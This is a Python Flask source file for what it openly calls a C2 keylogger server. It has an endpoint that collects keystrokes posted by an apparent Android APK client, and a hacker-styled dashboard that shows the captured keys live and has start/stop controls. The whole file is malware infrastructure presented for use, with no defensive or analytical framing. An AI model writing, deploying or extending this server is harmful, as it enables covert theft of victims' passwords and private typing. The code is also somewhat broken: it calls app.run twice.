from flask import Flask, request, jsonify
from markupsafe import escape
from threading import Lock, Thread
import time, os

app = Flask(__name__)
logs = []
demo_active = False
lock = Lock()

def demo_loop():
    while True:
        if demo_active:
            with lock:
                logs.append(f"[DEMO] {time.time()}")
                if len(logs) > 100: logs[:] = logs[-50:]
        time.sleep(2)
Thread(target=demo_loop, daemon=True).start()

@app.route('/keys', methods=['POST'])
def keys():
    data = request.form.get('keys', '')
    if data:
        with lock: logs.append(f"[KEYS] {data}")
    return 'OK'

@app.route('/', methods=['GET', 'POST'])
def home():
    cmd = request.form.get('cmd', '') if request.method == 'POST' else ''
    global demo_active
    if cmd == 'start': demo_active = True
    if cmd == 'stop': demo_active = False
    
    with lock:
        log_display = ' | '.join(logs[-10:]) or 'No keys yet...'
    
    return f'''
<!DOCTYPE html>
<html>
<head><title>C2 SERVER</title>
<style>body{{background:black;color:lime;font:monospace;padding:20px;}}
input{{width:100%;padding:10px;background:#111;color:lime;border:1px lime;}}
.btn{{padding:10px;background:lime;color:black;border:none;}}
pre{{background:#000;border:2px lime solid;padding:15px;height:300px;overflow:auto;}}</style>
</head>
<body>
<h1>🔥 C2 KEYLOGGER SERVER LIVE</h1>
<form method=post><input name=cmd placeholder="start / stop" autofocus>
<input type=submit value="RUN" class=btn></form>
<h2>📡 LIVE KEYS:</h2><pre>{escape(log_display)}</pre>
<h3>APK: POST /keys data={{'keys':'keystrokes'}}</h3>
<p>Status: {'ON' if demo_active else 'OFF'}</p>
</body></html>
'''
print("🚀 C2 SERVER: http://0.0.0.0:8080")
app.run(host='0.0.0.0', port=8080)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
